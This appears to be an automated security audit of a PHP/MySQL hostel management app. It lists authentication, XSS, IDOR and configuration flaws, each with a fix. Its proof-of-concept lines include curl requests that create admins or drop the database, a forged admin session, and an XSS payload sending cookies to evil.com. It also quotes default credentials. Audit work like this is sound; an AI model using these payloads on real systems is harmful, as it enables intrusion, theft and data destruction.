# Security Audit Report: Hostel Management System

**Application:** AVM Hostel Management System  
**Stack:** PHP 8.x + MySQL + Vanilla JavaScript (client-side SPA)  
**Audit Date:** 2 May 2026  
**Auditor:** Automated Security Review  

---

## Executive Summary

This application contains **multiple critical and high-severity vulnerabilities** that would allow complete system compromise by any authenticated or even unauthenticated attacker. The most severe issues are: the complete absence of server-side authentication/authorization on API endpoints, plaintext passwords stored in client-side JavaScript, and a fully open data synchronization endpoint that leaks every record in the database to any visitor.

**Severity Distribution:**

| Severity | Count |
|----------|-------|
| Critical | 8 |
| High | 9 |
| Medium | 7 |
| Low | 5 |

---

## 1. Authentication & Authorization Audit

### FINDING 1.1 — No Server-Side Session or Token Authentication on Any API Endpoint
**Severity: CRITICAL**

None of the PHP API endpoints (`sync.php`, `data.php`, `change-password.php`) verify that the request is coming from an authenticated user. There are no session checks, no JWT tokens, no API keys — nothing. Any person on the internet who can reach the server can call every endpoint.

**Affected Code — `api/data.php` (entire file):**
```php
// No session_start(), no token check, no auth whatsoever
$input  = json_decode(file_get_contents('php://input'), true) ?? [];
$jsKey  = $input['table']  ?? '';
$action = $input['action'] ?? '';
$data   = $input['data']   ?? [];
// Proceeds directly to INSERT/UPDATE/DELETE ...
```

**Attack:** An unauthenticated attacker sends:
```bash
curl -X POST https://target/api/data.php \
  -H "Content-Type: application/json" \
  -d '{"table":"users","action":"add","data":{"id":"evil","username":"hacker","password":"hacked","role":"admin","name":"Evil","email":"evil@evil.com"}}'
```
This creates a new admin user. The attacker then logs in and controls the entire system.

**Fix:** Implement server-side sessions with role-based checks on every endpoint:
```php
// auth.php — include at the top of every protected endpoint
session_start();
function requireRole(string ...$roles): array {
    if (!isset($_SESSION['user'])) {
        http_response_code(401);
        echo json_encode(['success' => false, 'error' => 'Not authenticated']);
        exit;
    }
    if (!in_array($_SESSION['user']['role'], $roles, true)) {
        http_response_code(403);
        echo json_encode(['success' => false, 'error' => 'Forbidden']);
        exit;
    }
    return $_SESSION['user'];
}

// Usage in data.php:
require_once __DIR__ . '/auth.php';
$user = requireRole('admin'); // Only admin can modify data
```

---

### FINDING 1.2 — Plaintext Passwords Stored in Client-Side JavaScript
**Severity: CRITICAL**

The `script.js` file contains a `HMS.defaults` object with every user's username and plaintext password hardcoded directly in the JavaScript that is delivered to every browser:

**Affected Code — `script.js`, lines within `HMS.defaults.users`:**
```javascript
{ id:'u1', username:'admin', password:'admin123', role:'admin', ... },
{ id:'u3', username:'reception', password:'rec123', role:'receptionist', ... },
{ id:'u2', username:'student123', password:'pass123', role:'student', ... },
// ... all 13 users with plaintext passwords
```

**Attack:** Visit the site, open DevTools → Sources → `script.js`, and read every credential including the admin account.

**Fix:** Remove all default user data from client-side JavaScript entirely. Passwords must never leave the server. The "offline fallback" login that checks `user.password` in localStorage must be removed.

---

### FINDING 1.3 — Offline Fallback Login Bypasses Server-Side Authentication
**Severity: CRITICAL**

When the PHP backend is unreachable, the `handleLogin()` function falls back to checking credentials against localStorage — which contains the plaintext passwords from Finding 1.2:

**Affected Code — `script.js`, `handleLogin()`:**
```javascript
} catch (err) {
    // PHP unavailable – fall back to localStorage demo mode
    const users = HMS.get('users');
    const user = users.find(u => u.username === username && u.password === password && u.role === role);
    if (user) {
      HMS.setSession({ userId: user.id, role: user.role, name: user.name });
      window.location.href = routes[user.role];
```

**Attack:** An attacker can block network requests to the API (e.g., via a browser extension or by simply modifying localStorage), and then authenticate using the hardcoded plaintext credentials. They can also modify localStorage directly to set any role.

**Fix:** Remove the fallback entirely. If the server is unreachable, display an error message — do not authenticate locally.

---

### FINDING 1.4 — Client-Side-Only Authorization (Role Check is Trivially Bypassed)
**Severity: CRITICAL**

The `requireAuth()` function only checks `sessionStorage`:

```javascript
function requireAuth(requiredRole) {
  HMS.init();
  const session = HMS.getSession();
  if (!session) { window.location.href = 'login.html'; return null; }
  if (requiredRole && session.role !== requiredRole) { window.location.href = 'login.html'; return null; }
  return session;
}
```

**Attack:** Open the browser console and run:
```javascript
sessionStorage.setItem('hms_session', JSON.stringify({userId:'u2', role:'admin', name:'Attacker'}));
window.location.href = 'owner-dashboard.html';
```
The attacker now has full admin access to the UI, and since the API has no auth (Finding 1.1), they have full control of the data as well.

**Fix:** All authorization must happen server-side. The client-side check is only a UX convenience and must never be the sole access control.

---

### FINDING 1.5 — Change Password Endpoint Has No Authentication
**Severity: HIGH**

`api/change-password.php` accepts a `userId` from the request body and changes that user's password — with no session check:

```php
$userId      = $input['userId']      ?? '';
$oldPassword = $input['oldPassword'] ?? '';
$newPassword = $input['newPassword'] ?? '';
// ...
$stmt = $pdo->prepare('SELECT password_hash FROM users WHERE id = ?');
$stmt->execute([$userId]);
```

**Attack:** If the attacker knows (or guesses) a userId and their current password, they can change it. More critically, since `sync.php` returns all user IDs (Finding 3.1), the attacker has the information needed. Combined with the weak default passwords (Finding 1.6), this allows account takeover.

**Fix:** The endpoint must verify the session belongs to the user whose password is being changed:
```php
require_once __DIR__ . '/auth.php';
$session = requireRole('student', 'admin', 'receptionist');
$userId = $session['id']; // Use session, not user input
```

---

### FINDING 1.6 — Weak Default Credentials
**Severity: HIGH**

All seeded accounts use trivially guessable passwords: `admin123`, `rec123`, `pass123`, `rahul123`, `sneha123`, etc. These follow the pattern `{name}123`.

**Affected Code — `api/setup.php`:**
```php
$users = [
    ['u1', 'admin', 'admin123', 'admin', ...],
    ['u3', 'reception', 'rec123', 'receptionist', ...],
```

**Fix:** Force password change on first login. Implement password complexity requirements (minimum 12 characters, mix of character types). The setup script should generate random passwords and display them once.

---

### FINDING 1.7 — No Password Complexity Enforcement
**Severity: MEDIUM**

The only password validation is a client-side `minlength="6"` check:
```javascript
if (np.length < 6) { notify('New password must be at least 6 characters', 'warning'); return; }
```

There is no server-side validation of password length or complexity.

**Fix:** Add server-side password policy enforcement in `change-password.php`:
```php
if (strlen($newPassword) < 12) {
    echo json_encode(['success' => false, 'error' => 'Password must be at least 12 characters']);
    exit;
}
```

---

## 2. Injection & Input Validation Audit

### FINDING 2.1 — Table Name Injection via Whitelist Bypass Path
**Severity: MEDIUM**

While `data.php` does use a whitelist for table names (`$tableMap`), the table name is interpolated directly into SQL strings without parameterization:

```php
$pdo->prepare("DELETE FROM $tableName WHERE id = ?")->execute([$data['id']]);
// ...
$pdo->prepare("INSERT IGNORE INTO $tableName ($colsQ) VALUES ($ph)")->execute($row);
// ...
$pdo->prepare("UPDATE $tableName SET $sets WHERE id=:id")->execute($row);
```

The `$tableName` comes from `$cfg['table']` which is hardcoded in the map, so this is currently safe. However, `$colsQ` and `$sets` are derived from `$colMap` keys which are also hardcoded. The risk is **low right now** but the pattern is dangerous — if anyone adds a column mapping with user-controlled data, it becomes exploitable.

**Severity: LOW** (currently safe due to hardcoded map, but fragile)

**Fix:** Use identifier quoting:
```php
$tableName = '`' . str_replace('`', '``', $cfg['table']) . '`';
```

---

### FINDING 2.2 — Stored XSS via Notice Board, Requests, and User-Controlled Fields
**Severity: HIGH**

Multiple locations render user-controlled data using `.innerHTML` without sanitization:

**Affected Code — `script.js`, `renderNotices()`:**
```javascript
const html = notices.length ? [...notices].reverse().map(n =>
    `<div class="notice-item ${n.type}">
      <div class="notice-title">${n.title}</div>
      <div class="notice-body">${n.body}</div>
      ...`
).join('') : '...';
containers.forEach(c => c.innerHTML = html);
```

Also in `renderAdminRequests()`:
```javascript
`<td>${r.description}</td>`
```

And `viewStudent()`:
```javascript
body.innerHTML = `... <div class="profile-name">${s.name}</div> ...`;
```

And the `notify()` function:
```javascript
n.innerHTML = `...<div class="notification-msg">${msg}</div>...`;
```

**Proof-of-Concept Attack:** An attacker (or a student) submits a request with this description:
```
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```
When the admin views the requests page, the JavaScript executes in their browser session.

**Fix:** Create a sanitization helper and use `textContent` instead of `innerHTML` where possible:
```javascript
function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

// Usage:
`<div class="notice-body">${escapeHtml(n.body)}</div>`
```

---

### FINDING 2.3 — XSS via `onclick` Handlers with Unsanitized IDs
**Severity: HIGH**

Throughout the rendering functions, user-controlled `id` values are injected into `onclick` handlers:

```javascript
`<button class="btn btn-sm btn-outline" onclick="viewStudent('${s.id}')">View</button>`
`<button class="btn btn-sm btn-danger" onclick="deleteRoom('${r.id}')">Delete</button>`
`<button class="btn btn-sm btn-success" onclick="respondRequest('${r.id}','approved')">Approve</button>`
```

**Attack:** If an attacker can control an `id` field (and they can, via the unprotected `data.php` API), they set it to:
```
');alert(document.cookie);//
```

This breaks out of the string literal and executes arbitrary JavaScript.

**Fix:** Use data attributes and event delegation instead of inline handlers:
```javascript
// Instead of onclick in template strings, use data attributes:
`<button class="btn btn-sm" data-action="view" data-id="${escapeHtml(s.id)}">View</button>`

// Event delegation:
document.addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const action = btn.dataset.action;
    const id = btn.dataset.id;
    if (action === 'view') viewStudent(id);
});
```

---

### FINDING 2.4 — No Input Validation or Length Limits on Server
**Severity: MEDIUM**

`data.php` accepts arbitrary data for any mapped column with no validation:
```php
foreach ($colMap as $jsCol => $dbCol) {
    if (array_key_exists($jsCol, $data)) {
        $row[$dbCol] = $data[$jsCol] === '' ? null : $data[$jsCol];
    }
}
```

There are no checks for data types, string lengths, valid email format, valid phone numbers, numeric ranges (rent, amount), or enum values. An attacker can set `rent` to a negative number, set `amount` to `99999999`, or put megabytes of text in the `description` field.

**Fix:** Add server-side validation before processing:
```php
// Example: validate room rent
if (isset($row['rent']) && (!is_numeric($row['rent']) || $row['rent'] < 0 || $row['rent'] > 100000)) {
    echo json_encode(['success' => false, 'error' => 'Invalid rent amount']);
    exit;
}
```

---

### FINDING 2.5 — SQL Injection via Dynamic Column Building
**Severity: MEDIUM**

In `data.php`, the UPDATE query builds the SET clause from array keys:
```php
$sets = implode(',', array_map(fn($c) => "$c=:$c", array_keys($row)));
```

While the keys currently come from the hardcoded `$colMap`, if a key contained SQL metacharacters (or if the map were ever extended to accept user-provided keys), this would be a direct SQL injection vector. The column names are not quoted or parameterized.

**Fix:** Quote column identifiers:
```php
$sets = implode(',', array_map(fn($c) => "`" . str_replace('`','``',$c) . "`=:$c", array_keys($row)));
```

---

## 3. API & Data Exposure Audit

### FINDING 3.1 — sync.php Exposes Entire Database to Unauthenticated Users
**Severity: CRITICAL**

`api/sync.php` returns ALL data from ALL tables — users, rooms, bookings, payments, requests, visitors, attendance, notices — with no authentication check:

```php
$users = $pdo->query(
    'SELECT id, username, role, name, email, phone,
            student_id AS studentId, room_id AS roomId,
            blood_group AS bloodGroup, emergency_contact AS emergencyContact,
            course, year_of_study AS year, father_name AS fatherName, address
     FROM users'
)->fetchAll();
```

**Attack:**
```bash
curl https://target/api/sync.php
```
Returns every user's personal information (emails, phone numbers, addresses, emergency contacts, blood groups, father's names), every payment record, every booking, every visitor log entry — everything.

**Fix:** Require authentication and scope data to the user's role:
```php
require_once __DIR__ . '/auth.php';
$session = requireRole('admin', 'receptionist', 'student');

// Students should only see their own data:
if ($session['role'] === 'student') {
    $stmt = $pdo->prepare('SELECT ... FROM bookings WHERE student_id = ?');
    $stmt->execute([$session['id']]);
    // ...
}
```

---

### FINDING 3.2 — PII Exposure in All User Responses
**Severity: HIGH**

Even if authentication were added, `sync.php` returns sensitive PII fields that most consumers don't need: `blood_group`, `emergency_contact`, `father_name`, `address`, `email`, `phone`.

**Fix:** Return only the fields needed for each role's view. Student users should not see other students' personal data.

---

### FINDING 3.3 — No Rate Limiting or Brute-Force Protection on Login
**Severity: HIGH**

`api/login.php` has no rate limiting, no account lockout, no CAPTCHA, and no delay on failed attempts:

```php
if ($user && password_verify($password, $user['password_hash'])) {
    echo json_encode(['success' => true, 'user' => [...]]);
} else {
    echo json_encode(['success' => false, 'error' => 'Invalid credentials']);
}
```

**Attack:** Automated brute-force can try thousands of passwords per second.

**Fix:** Implement rate limiting with exponential backoff:
```php
// Track failed attempts per IP
$ip = $_SERVER['REMOTE_ADDR'];
$stmt = $pdo->prepare('SELECT attempts, last_attempt FROM login_attempts WHERE ip = ?');
$stmt->execute([$ip]);
$record = $stmt->fetch();
if ($record && $record['attempts'] >= 5 && time() - strtotime($record['last_attempt']) < 900) {
    http_response_code(429);
    echo json_encode(['success' => false, 'error' => 'Too many attempts. Try again in 15 minutes.']);
    exit;
}
```

---

### FINDING 3.4 — No CORS Restrictions
**Severity: MEDIUM**

None of the API endpoints set CORS headers, which means the browser's default same-origin policy applies. However, there is no explicit `Access-Control-Allow-Origin` header, so if any reverse proxy or future configuration adds wildcard CORS, all endpoints become callable from any domain.

**Fix:** Explicitly restrict origins:
```php
header('Access-Control-Allow-Origin: https://yourdomain.com');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');
```

---

### FINDING 3.5 — Error Stack Trace Leakage
**Severity: MEDIUM**

`data.php` leaks the full exception message to the client:
```php
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}
```

And `db.php` leaks database connection details:
```php
echo json_encode(['success' => false, 'error' => 'DB connection failed: ' . $e->getMessage()]);
```

PDO exception messages can contain database hostnames, usernames, and internal paths.

**Fix:** Log the actual error server-side, return a generic message to the client:
```php
} catch (Exception $e) {
    error_log('data.php error: ' . $e->getMessage());
    echo json_encode(['success' => false, 'error' => 'An internal error occurred']);
}
```

---

### FINDING 3.6 — No Pagination, Enabling Mass Data Extraction
**Severity: MEDIUM**

`sync.php` returns the complete contents of every table in a single response with no pagination, limit, or filtering. As the database grows, this creates both a performance issue and an enumeration risk.

**Fix:** Implement pagination with cursor-based or offset-based limits:
```php
$limit = min((int)($input['limit'] ?? 50), 100);
$offset = max((int)($input['offset'] ?? 0), 0);
$stmt = $pdo->prepare('SELECT ... FROM users LIMIT ? OFFSET ?');
$stmt->execute([$limit, $offset]);
```

---

### FINDING 3.7 — No HTTP Security Headers
**Severity: MEDIUM**

None of the HTML pages or PHP responses set security headers. Missing headers include: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, and `Permissions-Policy`.

**Fix:** Add headers via `.htaccess` or PHP:
```php
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: strict-origin-when-cross-origin');
header("Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net");
```

---

## 4. Dependency & Configuration Security Audit

### FINDING 4.1 — Database Root Credentials with No Password, Hardcoded in Source
**Severity: CRITICAL**

`api/db.php` contains hardcoded database credentials with root access and an empty password:

```php
define('DB_HOST', 'localhost');
define('DB_NAME', 'hostel_management');
define('DB_USER', 'root');
define('DB_PASS', '');
```

The same credentials are duplicated in `api/migrate.php`.

**Fix:** Move credentials to environment variables and use a least-privilege database user:
```php
define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
define('DB_NAME', getenv('DB_NAME') ?: 'hostel_management');
define('DB_USER', getenv('DB_USER'));
define('DB_PASS', getenv('DB_PASS'));
```

Create a dedicated MySQL user:
```sql
CREATE USER 'hostel_app'@'localhost' IDENTIFIED BY 'strong-random-password';
GRANT SELECT, INSERT, UPDATE, DELETE ON hostel_management.* TO 'hostel_app'@'localhost';
```

---

### FINDING 4.2 — Setup and Migration Scripts Exposed in Production
**Severity: CRITICAL**

`api/setup.php` and `api/migrate.php` are publicly accessible and will **drop and recreate the entire database** if called:

```php
// migrate.php
$pdo->exec('DROP DATABASE IF EXISTS hostel_management');
$pdo->exec('CREATE DATABASE hostel_management ...');
```

`setup.php` also prints all demo credentials in its HTML output.

**Attack:**
```bash
curl https://target/api/migrate.php
```
Destroys the entire database.

**Fix:** Delete these files from production, or protect them:
```php
if (php_sapi_name() !== 'cli') {
    http_response_code(403);
    die('This script can only be run from the command line.');
}
```

---

### FINDING 4.3 — Demo Credentials Displayed on Login Page
**Severity: HIGH**

The login page has a "Demo Credentials" section with working admin credentials:
```html
<div class="demo-cred-item" onclick="fillCred('admin','admin123','admin')">
  <span class="role">Admin / Owner</span>
  <span class="creds">admin / admin123</span>
</div>
```

**Fix:** Remove the demo credentials section entirely from production builds.

---

### FINDING 4.4 — Chart.js Loaded from External CDN Without Integrity Hash
**Severity: LOW**

```html
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
```

If the CDN is compromised, malicious code would execute in every admin session.

**Fix:** Add Subresource Integrity (SRI):
```html
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"
  integrity="sha384-<hash>" crossorigin="anonymous"></script>
```

---

### FINDING 4.5 — No `.env` or `.gitignore` for Credentials
**Severity: LOW**

Database credentials are committed directly in PHP source. There is no `.env` file, no `.gitignore` excluding sensitive files, and no environment-based configuration.

**Fix:** Use a `.env` file with a library like `vlucas/phpdotenv`, and add `.env` to `.gitignore`.

---

## 5. Business Logic & State Management Audit

### FINDING 5.1 — Client-Side Trust: Users Can Manipulate Prices, Amounts, and IDs
**Severity: CRITICAL**

The client-side JavaScript handles all business logic. Payments, bookings, room assignments, and user roles are managed via `localStorage` and sent to the server with no verification:

**Affected Code — `script.js`, `submitPayment()`:**
```javascript
function submitPayment(e) {
  e.preventDefault();
  const method = document.getElementById('payMethod').value;
  const amount = Number(document.getElementById('payAmount').value);
  // ...
  HMS.update('payments', pending[0].id, { method, status:'paid', txnId:'TXN'+Date.now() });
```

**Attack Scenario:**
1. Student opens the payment modal
2. Changes the `payAmount` field to `1` (or `0`)
3. Submits — the payment is recorded as "paid" with the manipulated amount
4. The server receives this via `data.php` and stores it without validation

The student has effectively paid ₹1 instead of ₹5000.

**Fix:** Payment processing must happen entirely server-side. The server should determine the amount owed based on the booking, not trust the client:
```php
// Server-side payment processing
$booking = getBookingForStudent($session['id']);
$amountDue = $booking['amount'];
// Process with actual payment gateway, not client-submitted amount
```

---

### FINDING 5.2 — Insecure Direct Object References (IDOR) on All Endpoints
**Severity: CRITICAL**

Since `data.php` has no authentication, any user can modify any other user's records by specifying their ID:

```bash
# A student changes another student's room assignment
curl -X POST https://target/api/data.php \
  -H "Content-Type: application/json" \
  -d '{"table":"users","action":"update","data":{"id":"u4","roomId":"r8"}}'

# A student marks their own payment as paid
curl -X POST https://target/api/data.php \
  -d '{"table":"payments","action":"update","data":{"id":"p6","status":"paid","method":"Cash","txnId":"FAKE123"}}'
```

**Fix:** Even with authentication added, the server must verify ownership:
```php
// Students can only modify their own records
if ($session['role'] === 'student' && $jsKey === 'payments') {
    $payment = getPaymentById($data['id']);
    if ($payment['student_id'] !== $session['id']) {
        http_response_code(403);
        echo json_encode(['success' => false, 'error' => 'Access denied']);
        exit;
    }
}
```

---

### FINDING 5.3 — Students Can Self-Promote to Admin Role
**Severity: CRITICAL**

Since `data.php` accepts role changes and has no access control:

```bash
curl -X POST https://target/api/data.php \
  -d '{"table":"users","action":"update","data":{"id":"u2","role":"admin"}}'
```

A student can change their own role to admin in the database.

**Fix:** The `role` field must be immutable via the data API. Only an admin should be able to change roles, and only through a dedicated endpoint with proper authorization.

---

### FINDING 5.4 — No Idempotency on Payment Operations
**Severity: HIGH**

The `submitPayment()` function generates transaction IDs client-side with `'TXN'+Date.now()`. There is no server-side idempotency check, so the same payment can be submitted multiple times:

```javascript
HMS.update('payments', pending[0].id, { method, status:'paid', txnId:'TXN'+Date.now() });
```

**Attack:** Rapidly clicking "Pay Now" can create duplicate payment records or update multiple pending payments simultaneously.

**Fix:** Generate transaction IDs server-side and use database constraints:
```sql
ALTER TABLE payments ADD UNIQUE INDEX idx_txn_id (txn_id);
```

---

### FINDING 5.5 — Race Condition in Room Occupancy
**Severity: HIGH**

When adding a student, the room occupancy is updated client-side:
```javascript
const newOccupied = Math.min(room.occupied + 1, room.beds);
HMS.update('rooms', roomId, { occupied: newOccupied, ... });
```

Two administrators adding students simultaneously could both read `occupied = 1`, both calculate `occupied = 2`, and assign 2 students — but the room only has 2 beds and now has 3 occupants.

**Fix:** Use database-level atomic increments:
```sql
UPDATE rooms SET occupied = occupied + 1 WHERE id = ? AND occupied < beds;
-- Check affected rows; if 0, the room is full
```

---

### FINDING 5.6 — Workflow Steps Can Be Skipped
**Severity: HIGH**

There is no server-side state machine for bookings or payments. A booking can be set to "active" without a corresponding payment. A payment can be marked "paid" without going through any actual payment gateway:

```bash
# Skip payment entirely, just mark as paid
curl -X POST https://target/api/data.php \
  -d '{"table":"payments","action":"update","data":{"id":"p6","status":"paid"}}'
```

**Fix:** Implement server-side workflow validation. Status transitions should be enforced (e.g., a payment can only go from "pending" to "paid" if confirmed by a payment gateway callback).

---

### FINDING 5.7 — No Audit Logging
**Severity: HIGH**

There are no audit logs for any action in the system. No record is kept of who logged in, who changed a password, who deleted a student, who modified a payment status, or who accessed sensitive data.

**Fix:** Create an `audit_log` table:
```sql
CREATE TABLE audit_log (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    user_id VARCHAR(30),
    action VARCHAR(100) NOT NULL,
    table_name VARCHAR(50),
    record_id VARCHAR(30),
    old_value JSON,
    new_value JSON,
    ip_address VARCHAR(45),
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

Log every write operation in `data.php`.

---

### FINDING 5.8 — Client-Side ID Generation is Predictable
**Severity: LOW**

Record IDs are generated client-side using `Math.random()`:
```javascript
genId() { return '_' + Math.random().toString(36).slice(2, 11); }
```

`Math.random()` is not cryptographically secure and produces predictable values.

**Fix:** Generate IDs server-side using `random_bytes()` or `uuid_create()`:
```php
function genId(): string {
    return bin2hex(random_bytes(12));
}
```

---

### FINDING 5.9 — Print Receipt Opens Uncontrolled HTML in New Window
**Severity: LOW**

The `printReceipt()` function opens a new window and writes arbitrary HTML including user-controlled data (student name, transaction ID) without sanitization:

```javascript
w.document.body.innerHTML = `<h2>Hostel Pro - Payment Receipt</h2>
    <p><strong>Student:</strong> ${student?.name}</p>
    ...`;
```

**Fix:** Sanitize all values before injecting into the receipt HTML.

---

## Prioritized Remediation Roadmap

### Immediate (Week 1) — Critical Issues
1. **Add server-side authentication** to all API endpoints (Findings 1.1, 1.5)
2. **Remove all plaintext passwords** from `script.js` and localStorage (Findings 1.2, 1.3)
3. **Protect or delete `setup.php` and `migrate.php`** in production (Finding 4.2)
4. **Move database credentials** to environment variables (Finding 4.1)
5. **Add authorization checks** — students can only access their own data (Findings 5.2, 5.3)

### Short-Term (Week 2-3) — High Issues
6. **Sanitize all HTML output** to prevent XSS (Findings 2.2, 2.3)
7. **Move business logic server-side** — payments, bookings, role changes (Findings 5.1, 5.4, 5.6)
8. **Add rate limiting** on the login endpoint (Finding 3.3)
9. **Implement audit logging** (Finding 5.7)
10. **Add server-side input validation** on all endpoints (Finding 2.4)
11. **Remove demo credentials** from the login page (Finding 4.3)

### Medium-Term (Month 1-2) — Medium/Low Issues
12. Add HTTP security headers (Finding 3.7)
13. Add SRI hashes for external scripts (Finding 4.4)
14. Implement pagination on data endpoints (Finding 3.6)
15. Add CORS restrictions (Finding 3.4)
16. Implement atomic database operations for occupancy (Finding 5.5)
17. Generate IDs server-side with CSPRNG (Finding 5.8)
18. Suppress error details in production (Finding 3.5)
